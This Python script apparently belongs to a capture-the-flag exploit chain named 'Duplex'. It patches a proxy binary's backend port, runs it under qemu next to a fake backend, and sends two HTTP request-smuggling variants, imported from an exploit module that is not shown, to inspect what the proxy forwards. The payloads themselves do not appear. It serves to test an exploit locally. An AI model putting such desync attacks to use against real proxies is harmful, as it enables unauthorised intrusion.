#!/usr/bin/env python3
"""Local check of the *frontend* half of the Duplex chain.

We can't install httpd:2.4.49 here, but the desync happens in the proxy, so it is
enough to stand up a fake backend and look at the bytes the proxy forwards.

The proxy hard-codes 127.0.0.1:80 for the backend; binding :80 needs root, so we
patch the "80" string (file offset 0x3026) to "81" in a copy instead.
"""
import os
import socket
import subprocess
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
PROXY = os.path.join(HERE, "duplex", "proxy")
PROXY81 = os.path.join(HERE, "proxy81")
BACKEND_PORT = 81
FRONTEND_PORT = 8080
received = []


def make_proxy81():
    d = bytearray(open(PROXY, "rb").read())
    assert d[0x3026:0x3028] == b"80", d[0x3026:0x3028]
    d[0x3026:0x3028] = b"81"
    open(PROXY81, "wb").write(d)
    os.chmod(PROXY81, 0o755)


def backend():
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", BACKEND_PORT))
    srv.listen(5)
    srv.settimeout(20)
    try:
        while True:
            c, _ = srv.accept()
            c.settimeout(3)
            buf = b""
            try:
                while True:
                    b = c.recv(65536)
                    if not b:
                        break
                    buf += b
            except socket.timeout:
                pass
            received.append(buf)
            c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nFAKE\n")
            c.close()
    except Exception:
        pass


def main():
    make_proxy81()
    t = threading.Thread(target=backend, daemon=True)
    t.start()
    time.sleep(0.5)

    p = subprocess.Popen(
        ["qemu-x86_64-static", "-L", "/usr/x86_64-linux-gnu", PROXY81],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    )
    time.sleep(1.0)

    import exploit

    for name, payload in (("chunked", exploit.variant_chunked()),
                          ("identity", exploit.variant_identity())):
        received.clear()
        try:
            s = socket.create_connection(("127.0.0.1", FRONTEND_PORT), timeout=10)
        except Exception as e:
            print(f"[!] cannot reach frontend: {e}; proxy said:")
            print(p.stdout.read(2000).decode(errors="replace"))
            p.kill()
            return
        s.settimeout(5)
        s.sendall(payload)
        try:
            resp = s.recv(65536)
        except socket.timeout:
            resp = b""
        s.close()
        time.sleep(0.4)
        print(f"\n===== variant '{name}' =====")
        print("frontend replied:", resp[:200])
        for i, buf in enumerate(received):
            print(f"--- backend saw ({len(buf)} bytes) ---")
            print(buf.decode("latin1", "replace"))

    p.kill()


if __name__ == "__main__":
    main()
